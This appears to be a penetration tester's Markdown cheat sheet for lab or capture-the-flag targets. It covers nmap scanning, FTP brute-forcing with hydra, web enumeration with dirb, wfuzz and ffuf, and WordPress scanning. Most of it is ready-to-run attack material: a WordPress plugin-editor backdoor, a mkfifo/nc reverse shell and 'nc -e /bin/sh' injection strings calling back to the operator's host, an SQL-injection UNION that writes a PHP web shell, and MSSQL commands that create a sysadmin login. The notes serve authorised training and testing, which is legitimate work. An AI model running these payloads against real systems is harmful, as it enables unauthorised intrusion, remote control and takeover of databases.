# scanning
* `TCP` Scan
TARGET=<ip> && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
* `vulnerabilities` Scan
nmap -n -sV --script vuln <TARGET> -Pn -vvv
* `UDP` scan
nmap -p- --min-rate=1000 -T4 <TARGET> -Pn -sU -vvv
* `ftp bruteforce`
nmap --script ftp-brute -p 21 <TARGET> -Pn
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<ip>
medusa -h <ip> -u postgres -p postgres -M postgres -m DB:postgres -n 5437 -s
**check port is correct**
**sometimes does not work, need manual bruteforce if needed**
**some ports have ssl**
* `udp 69 tftp`
    > nmap -n -Pn -sU -p69 -sV --script tftp-enum <ip>
* All output `formats`
    > nmap -p- -sC -sV -oA tcp_all_ports <TARGET>
* when stuck, `fingerprint` the port and `google` the response
* always use `-vvv` for nmap scan

## nc scanner
> for p in {1..65535}; do nc -vn <ip> $p -w 1 -z & done 2> output.txt
> for p in {1..65535}; do proxychains -q nc -vn <ip> $p -w 1 -z & done 2> output.txt
> wc -l output.txt # Progress 131070
```bash
#!/bin/bash
host=$1
for port in {1..65535}; do
 timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
 echo "port $port is open"
done
echo "Done"
```



# Web enum
## tips
* when clicking on the nag bar, the path maybe spelled wrong, check spelling
* don't forget to vuln-search using google
* when GET doesn't give anything, try POST
* basic auth: curl --user <user>:<pass> <ip>:<port>/pwn.php
* if cannot find http, try `https`

## dirb
* A more complete list for directory discovery
    > dirb http://<ip> /usr/share/wordlists/dirb/big.txt -X .php
* lists to try
    * /usr/share/wordlists/dirb/common.txt
    * /usr/share/wordlists/dirb/big.txt
    * /usr/share/wordlists/SecLists/Discovery/Web-Content/CGIs.txt
    * /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
* Sometimes dirsearch cannot find everything, try using dirb instead
    > dirb http://target-ip -r
* curl the page to see `hidden` text

## parse `href` in curl response
> curl http://loly.lc/wordpress/ | sed -n 's/.*href="\([^"]*\).*/\1/p'
> curl <ip> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
> curl http://<ip>/ | html2text

## dirsearch
> dirsearch -u http://<ip> -e php,asp,aspx,jsp,js,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f -r
-e EXTENSIONS, --extensions=EXTENSIONS  Extension list separated by comma (Example: php,asp)
-E, --extensions-list  Use predefined list of common extensions
-f, --force-extensions  Force extensions for every wordlist entry (like in DirBuster)
-r, --recursive
-x EXCLUDESTATUSCODES
--exclude-texts=EXCLUDETEXTS  Exclude responses by texts, separated by comma (example: "Not found", "Error")
-c COOKIE, --cookie=COOKIE
-F, --follow-redirects

## wfuzz
> wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --sc 200 http://<ip>/FUZZ

## dirb
> dirb http://<ip> /usr/share/wordlists/dirb/big.txt -X .php,.txt,.json,.html

## `Subdomain` enumeration
> gobuster -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt vhost -u http://target.domain
> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107
> ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://domain/ -H "Host: FUZZ.domain" -fl 10

## svn
* enum svn repo
    > svn log --username admin --password admin http://<ip>/svn/dev/
    > svn diff -r 3:1 --username admin --password admin http://<ip>/svn/dev/


# web app
**use html2txt and read posts for hints**
## wordpress
> wpscan --url http://<ip>/ -e vp,vt,u,cb,dbe
> wpscan --url https://<ip>/ -e vp,vt,u,cb,dbe --disable-tls-checks
* http://<ip>/wp-content/robots.txt
* http://<ip>/wp-content/uploads/
* http://<ip>/wp-content/plugins/
* agressive detection
> wpscan --url http://<ip> -e p,u --plugins-detection aggressive
* backdoor through hello-dolly
    * update http://<ip>/wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select
    * activate plugin
    * browse to: http://<ip>/wp-content/plugins/hello-dolly/hello.php?cmd=ls
    * apply url encoded reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f
* always check `wp-config.php` for db password

## lfi
* `php filters`, curl http://<ip>/index.php?m=php://filter/convert.base64-encode/resource=index
* http://<ip>/index.php?page='.system('ls').'

## cmd injection
* ${IFS} can be used as space
* `ping command through web`: try `%0a` new line character
> aaaa;`nc+-e+/bin/sh+<ip>+80`
> os.system("nc -e /bin/sh <ip> 80")

## http headers injection
* Apache log poisoning, write through User-Agent or URL into the log file and achieve RCE through LFI
    * Use burp to avoid encoding issues
* The http header maybe spoofable, `X-Forwarded-For: 127.0.0.1`

## sqli
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-stacked-query
* create shell using sqli
    > ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
* `logic` injection
    > ' or '1'='1' --
* `create user` and add as sys admin
    > create login hacker with password='password',default_database=[master]
    > EXEC master..sp_addsrvrolemember @loginame = N'hacker', @rolename = N'sysadmin'
* Database type Query
    * Microsoft, MySQL `SELECT @@version`
    * Oracle `SELECT * FROM v$version`
    * PostgreSQL `SELECT version()`
* https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md

## sqlmap
* post
> sqlmap -u http://<ip>/login.php?login=true -p user,password --data "user=1&password=2" --method POST

## upload
* Some the upload only checks for extension, change the extension before upload, then capture the request and change the filename parameter in the request body

## tools
* joomscan



# cms enumeration
* check online about the cms, how the passwords are generated
* some cms target allow mysql login, try the simplest
* some hints use base64 and base32 decode
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
MFZG233VOI5FG2DJMVWGIQBRGIZQ====



# Ref
* default username and passwords: https://datarecovery.com/rd/default-passwords/
* https://www.exploit-db.com/
* https://book.hacktricks.xyz/
* https://www.hackingarticles.in/
